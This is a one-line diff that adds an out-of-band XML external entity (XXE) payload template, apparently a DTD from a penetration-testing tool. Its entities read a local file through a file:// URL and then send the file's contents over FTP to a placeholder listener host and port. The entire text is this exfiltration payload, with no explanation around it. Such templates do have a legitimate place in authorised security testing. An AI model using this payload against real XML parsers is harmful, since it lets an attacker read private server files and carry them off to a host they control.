@@ -1,0 +1,1 @@
+<!ENTITY % bbb SYSTEM "file://$xxe_lfi"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://$xxe_tip:%bbb;@$local_ip:$ftp_port/b'>">
